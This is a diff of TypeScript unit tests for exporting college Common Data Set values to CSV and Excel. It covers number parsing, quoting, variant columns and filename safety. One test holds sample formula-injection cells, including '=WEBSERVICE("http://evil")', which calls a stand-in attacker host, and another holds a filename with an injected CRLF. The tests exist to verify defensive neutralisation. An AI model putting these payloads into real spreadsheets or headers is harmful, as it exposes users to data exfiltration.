@@ -34,7 +34,6 @@ function input(overrides: Partial<SpreadsheetInput> = {}): SpreadsheetInput {
           // and the value carries CSV-hostile characters
           "A.999": field('Yes, "posted"', { question: "Posted, on web?" }),
         },
-        totalKnownFields: 900,
       },
     ],
     ...overrides,
@@ -61,6 +60,11 @@ describe("toSpreadsheetNumber", () => {
     expect(toSpreadsheetNumber("1,200 - 1,400", "Number")).toBeNull();
     expect(toSpreadsheetNumber("", "Number")).toBeNull();
   });
+
+  it("refuses negative-looking strings (CDS values are never negative)", () => {
+    expect(toSpreadsheetNumber("-5", "Number")).toBeNull();
+    expect(toSpreadsheetNumber("-$1,000", "Nearest $1")).toBeNull();
+  });
 });
 
 describe("buildFieldRows", () => {
@@ -80,6 +84,25 @@ describe("buildFieldRows", () => {
 
     const fallbackLabel = rows.find((r) => r.fieldId === "A.999");
     expect(fallbackLabel!.label).toBe("Posted, on web?");
+  });
+
+  it("prefers value_decoded over the raw value", () => {
+    const rows = buildFieldRows(
+      input({
+        documents: [
+          {
+            variant: null,
+            schemaVersion: "2024-25",
+            sourceUrl: null,
+            values: {
+              "C.101": field("54008.0", { value_decoded: "54,008" }),
+            },
+          },
+        ],
+      }),
+    );
+    expect(rows[0].raw).toBe("54,008");
+    expect(rows[0].numeric).toBe(54008);
   });
 
   it("passes through the LLM fallback source marker", () => {
@@ -116,6 +139,80 @@ describe("buildCdsCsv", () => {
     const csv = buildCdsCsv(input());
     expect(csv).toContain('"Yes, ""posted"""');
     expect(csv).toContain('"Posted, on web?"');
+  });
+
+  it("neutralizes formula-leading cells (CWE-1236)", () => {
+    const doc = input().documents[0];
+    const csv = buildCdsCsv(
+      input({
+        documents: [
+          {
+            ...doc,
+            values: {
+              "A.999": field('=WEBSERVICE("http://evil")', { question: "Q" }),
+              "A.998": field("@SUM(1,2)", { question: "Q2" }),
+              "A.997": field("+SUM(1,2)", { question: "Q3" }),
+            },
+          },
+        ],
+      }),
+    );
+    expect(csv).toContain("'=WEBSERVICE(");
+    expect(csv).toContain("'@SUM(");
+    expect(csv).toContain("'+SUM(");
+  });
+
+  it("keeps plain signed numbers as published", () => {
+    const doc = input().documents[0];
+    const csv = buildCdsCsv(
+      input({
+        documents: [
+          {
+            ...doc,
+            values: {
+              "A.999": field("-5", { question: "Q" }),
+              "A.998": field("+3.2", { question: "Q2" }),
+            },
+          },
+        ],
+      }),
+    );
+    expect(csv).toContain(",-5,");
+    expect(csv).toContain(",+3.2,");
+    expect(csv).not.toContain("'-5");
+    expect(csv).not.toContain("'+3.2");
+  });
+
+  it("emits the variant column for multi-variant schools", () => {
+    const doc = input().documents[0];
+    const csv = buildCdsCsv(
+      input({
+        documents: [
+          { ...doc, variant: null },
+          { ...doc, variant: "School of Engineering" },
+        ],
+      }),
+    );
+    expect(csv).toContain(",School of Engineering,");
+  });
+
+  it("quotes values containing newlines so rows stay intact", () => {
+    const csv = buildCdsCsv(
+      input({
+        documents: [
+          {
+            variant: null,
+            schemaVersion: "2024-25",
+            sourceUrl: null,
+            values: { "A.999": field("line1\nline2", { question: "Q" }) },
+          },
+        ],
+      }),
+    );
+    expect(csv).toContain('"line1\nline2"');
+    // Exactly header + one data row despite the embedded newline.
+    const rows = csv.match(/\r\n/g)!;
+    expect(rows).toHaveLength(2);
   });
 });
 
@@ -191,6 +288,48 @@ describe("buildCdsWorkbook", () => {
     expect(readme).not.toContain("LLM fallback");
     expect(readme).toContain("Data &amp; attribution");
     expect(readme).toContain("api.collegedata.fyi");
+
+    const withFallback = readZipEntry(
+      buildCdsWorkbook(
+        input({
+          documents: [
+            {
+              variant: null,
+              schemaVersion: "2024-25",
+              sourceUrl: null,
+              values: {
+                "C.101": field("54,008", { source: "tier4_llm_fallback" }),
+              },
+            },
+          ],
+        }),
+      ),
+      "xl/worksheets/sheet1.xml",
+    );
+    expect(withFallback).toContain("LLM fallback");
+  });
+
+  it("labels variant source documents in the README and skips missing URLs", () => {
+    const doc = input().documents[0];
+    const readme = readZipEntry(
+      buildCdsWorkbook(
+        input({
+          documents: [
+            { ...doc, sourceUrl: null },
+            {
+              ...doc,
+              variant: "School of Engineering",
+              sourceUrl: "https://example.com/soe.pdf",
+            },
+          ],
+        }),
+      ),
+      "xl/worksheets/sheet1.xml",
+    );
+    expect(readme).toContain("Source document (School of Engineering)");
+    expect(readme).toContain("https://example.com/soe.pdf");
+    // The null-sourceUrl main document contributes no plain source line.
+    expect(readme).not.toMatch(/>Source document</);
   });
 });
 
@@ -198,6 +337,12 @@ describe("spreadsheetFilename", () => {
   it("names files school-cds-year", () => {
     expect(spreadsheetFilename("harvard", "2024-25", "xlsx")).toBe(
       "harvard-cds-2024-25.xlsx",
+    );
+  });
+
+  it("produces a header-safe filename for hostile ids", () => {
+    expect(spreadsheetFilename('x"\r\ny', "2024-25", "csv")).toBe(
+      "x---y-cds-2024-25.csv",
     );
   });
 });
